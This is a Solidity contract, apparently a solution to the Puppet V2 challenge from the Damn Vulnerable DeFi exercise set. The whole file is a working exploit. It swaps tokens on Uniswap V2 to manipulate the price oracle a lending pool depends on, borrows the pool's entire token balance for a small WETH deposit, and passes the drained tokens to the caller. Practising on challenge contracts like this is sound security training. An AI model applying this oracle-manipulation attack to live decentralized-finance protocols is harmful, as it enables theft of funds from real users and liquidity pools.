// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./PuppetV2Pool.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

import "hardhat/console.sol";

// Not using the WETH contract from solady as the version is incompatible, must use version 0.6.0 here
interface WETHInterface is IERC20 {
    function deposit() external payable;
}

contract PuppetV2Exploit {
    PuppetV2Pool pool;
    IUniswapV2Router02 router;

    IERC20 private token;
    WETHInterface private weth;

    constructor(
        PuppetV2Pool _pool,
        IUniswapV2Router02 _router,
        WETHInterface _weth,
        IERC20 _token
    ) public {
        pool = _pool;
        router = _router;
        weth = _weth;
        token = _token;
    }

    function runExploit() external payable {
        // Convert all the ETH to WETH
        weth.deposit{value: msg.value}();

        token.transferFrom(
            msg.sender,
            address(this),
            token.balanceOf(msg.sender)
        );

        token.approve(address(router), token.balanceOf(address(this)));

        // Swap all the DVT tokens to WETH, this will manipulate the conversion rate so that we can borrow the entire supply from the pool
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        router.swapExactTokensForTokens(
            token.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1
        );

        uint256 poolBalance = token.balanceOf(address(pool));

        uint256 depositRequired = pool.calculateDepositOfWETHRequired(
            poolBalance
        );

        weth.approve(address(pool), depositRequired);

        pool.borrow(poolBalance);

        token.transfer(msg.sender, poolBalance);
    }
}
